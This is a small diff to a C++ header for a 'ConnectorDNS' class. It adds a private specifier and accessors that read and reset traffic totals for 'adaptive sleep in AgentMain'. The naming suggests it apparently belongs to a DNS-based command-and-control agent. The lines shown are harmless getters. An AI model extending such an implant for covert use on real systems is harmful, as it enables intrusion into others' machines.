@@ -5,6 +5,7 @@
 
 class ConnectorDNS
 {
+private:
     ProfileDNS profile = { 0 };
 
     // cached session/transport parameters
@@ -45,4 +46,9 @@ public:
     BYTE* RecvData();
     int   RecvSize();
     void  RecvClear();
+
+    // Helpers for adaptive sleep in AgentMain (read-only + reset)
+    ULONG GetLastUpTotal() const { return lastUpTotal; }
+    ULONG GetLastDownTotal() const { return lastDownTotal; }
+    void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
 };
